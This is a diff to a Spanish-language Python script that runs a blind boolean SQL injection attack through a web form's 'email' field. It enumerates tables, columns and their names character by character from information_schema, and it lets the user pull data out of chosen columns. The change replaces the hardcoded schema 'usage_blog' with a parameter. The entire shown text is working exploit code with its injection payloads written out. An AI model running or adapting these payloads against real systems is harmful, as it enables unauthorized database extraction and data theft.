@@ -60,13 +60,13 @@ def DB_usada(token, cabeceras):
 
 
 #Descubrimiento de numero de tablas:
-def num_tablas(token, headers):
+def num_tablas(token, headers, BBDD_usada):
 
     print("descubriendo...")
     for i in range(1, 100000000):
         data = {
         '_token': f'{token}',
-        'email': f"darsel@darsel.com\' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema='usage_blog')={i} -- -" 
+        'email': f"darsel@darsel.com\' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema='{BBDD_usada}')={i} -- -" 
         }
         # Peticion POST
         response = requests.post(url, data=data, headers=headers)
@@ -78,7 +78,7 @@ def num_tablas(token, headers):
 
 
 #Descubrimiento de nombres de tablas:
-def nombre_tablas(numero_tabla, headers, token):
+def nombre_tablas(numero_tabla, headers, token, BBDD_usada):
     
     print("descubriendo...")
     tabla = ""
@@ -92,7 +92,7 @@ def nombre_tablas(numero_tabla, headers, token):
             for char in ascii:
                 data = {
                 '_token': f'{token}',
-                'email': f"darsel@darsel.com\' AND (SELECT SUBSTRING(table_name,{num_letra},1) FROM information_schema.tables WHERE table_schema='usage_blog' LIMIT {numero_tabla -1},1)='{char}'-- -" 
+                'email': f"darsel@darsel.com\' AND (SELECT SUBSTRING(table_name,{num_letra},1) FROM information_schema.tables WHERE table_schema='{BBDD_usada}' LIMIT {numero_tabla -1},1)='{char}'-- -" 
                 }
 
                 # Peticion POST
@@ -118,14 +118,14 @@ def nombre_tablas(numero_tabla, headers, token):
 
 
 #Descubrimiento del numero de columnas de una tabla
-def numero_columnas(tabla, token, cabeceras):
+def numero_columnas(tabla, token, cabeceras, BBDD_usada):
 
     print("\n\nDescubriendo...")
     for i in range(1, 500):
         
         data = {
         '_token': f'{token}',
-        'email': f"darsel@darsel.com\' AND (SELECT COUNT(column_name) FROM information_schema.columns WHERE table_schema='usage_blog' AND table_name='{tabla}')={i} -- -" 
+        'email': f"darsel@darsel.com\' AND (SELECT COUNT(column_name) FROM information_schema.columns WHERE table_schema='{BBDD_usada}' AND table_name='{tabla}')={i} -- -" 
         }
 
         # Peticion POST
@@ -138,7 +138,7 @@ def numero_columnas(tabla, token, cabeceras):
 
 
 #Descubrimiento de las columnas de una tabla
-def nombres_columnas(tabla, cantidad, token, cabeceras):
+def nombres_columnas(tabla, cantidad, token, cabeceras, BBDD_usada):
     print("descubriendo...")
     columnas = []
     columna = ""
@@ -153,7 +153,7 @@ def nombres_columnas(tabla, cantidad, token, cabeceras):
                         
                         data = {
                             '_token': f'{token}',
-                            'email': f"darsel@darsel.com\' AND (SELECT SUBSTRING(column_name,{i},1) FROM information_schema.columns WHERE table_schema='usage_blog' AND table_name='{tabla}' LIMIT {num},1)='{char}' -- -" 
+                            'email': f"darsel@darsel.com\' AND (SELECT SUBSTRING(column_name,{i},1) FROM information_schema.columns WHERE table_schema='{BBDD_usada}' AND table_name='{tabla}' LIMIT {num},1)='{char}' -- -" 
                             }
                         
                         # Peticion POST
@@ -253,14 +253,14 @@ def main():
 
     #Descubrimiento del numero de tablas
     print("Descubriendo el número de tablas...")
-    cantidad_de_tablas = num_tablas(token, cabeceras)
+    cantidad_de_tablas = num_tablas(token, cabeceras, BBDD_usada)
     print(f"\nLa BBDD {BBDD_usada} contiene {cantidad_de_tablas} tablas.\n")
 
     #Descubrimiento de nombres de tablas
     tablas_escogidas = []
     tabla_escogida = int(input(f"Pasamos a descubrir los nombres de las tablas, selecciona el número de la tabla que quieres probar. (Hay {cantidad_de_tablas} tablas) :\n>> "))
     tablas_escogidas.append(tabla_escogida)
-    tabla_encontrada = nombre_tablas(tabla_escogida, cabeceras, token)
+    tabla_encontrada = nombre_tablas(tabla_escogida, cabeceras, token, BBDD_usada)
     print(f"\nTabla encontrada: {tabla_encontrada}")
     print(f"\nTablas encontradas hasta ahora: {tablas}")
 
@@ -269,19 +269,19 @@ def main():
         print(f"Hasta ahora has explorado la/s tabla/s {tablas_escogidas}")
         tabla_escogida = int(input(f"Pasamos a descubrir los nombres de las tablas, selecciona el número de la tabla que quieres probar. (Hay {cantidad_de_tablas} tablas) :\n>> "))
         tablas_escogidas.append(tabla_escogida)
-        tabla_encontrada = nombre_tablas(tabla_escogida, cabeceras, token)
+        tabla_encontrada = nombre_tablas(tabla_escogida, cabeceras, token, BBDD_usada)
         print(f"\nTabla encontrada: {tabla_encontrada}")
         print(f"Tablas encontradas hasta ahora: {tablas}")
 
     
     #Descubrimiento de numero de columnas
     tabla_escogida = tablas[int(input(f"\nPasamos a descubrir las columnas, selecciona el número de la tabla que quieres probar siendo 1 la primera, 2 la segunda... \nTablas descubiertas: {tablas} :\n>> "))-1]
-    cantidad_columnas = numero_columnas(tabla_escogida, token, cabeceras)
+    cantidad_columnas = numero_columnas(tabla_escogida, token, cabeceras, BBDD_usada)
     print(f"La tabla {tabla_escogida} contiene {cantidad_columnas} columnas.")
 
     
     #Descubrimiento de nombres de columnas
-    columnas = nombres_columnas(tabla_escogida, cantidad_columnas, token, cabeceras)
+    columnas = nombres_columnas(tabla_escogida, cantidad_columnas, token, cabeceras, BBDD_usada)
     print(f"\nLas columnas de la tabla {tabla_escogida} son:\n{columnas}")
 
     while input("Quieres sacar datos de alguna columna? s/n\n>> ") != "n":
